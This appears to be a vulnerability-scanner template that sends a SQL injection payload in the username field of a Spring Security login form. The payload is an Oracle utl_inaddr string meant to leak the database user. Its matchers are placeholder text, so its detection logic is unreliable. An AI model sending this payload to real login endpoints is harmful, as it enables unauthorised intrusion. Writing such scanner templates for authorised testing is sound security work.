content:
id: spring-security-sql-injection

info:
  name: Spring Security SQL Injection via j_spring_security_check
  author: 无垢
  severity: high
  description: Checks for SQL injection vulnerability in j_spring_security_check login.
  reference:
    - https://www.example.com/sql-injection-reference
  tags: security,spring,sqlinjection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/j_spring_security_check"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
      Content-Type: application/x-www-form-urlencoded

    body: |
      j_username=admin'and%20utl_inaddr.get_host_name(user)='0&j_dept=default

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "specific error message"
          - "Oracle specific error"
        part: body

      - type: status
        status:
          - 200
          - 500
author: 无垢
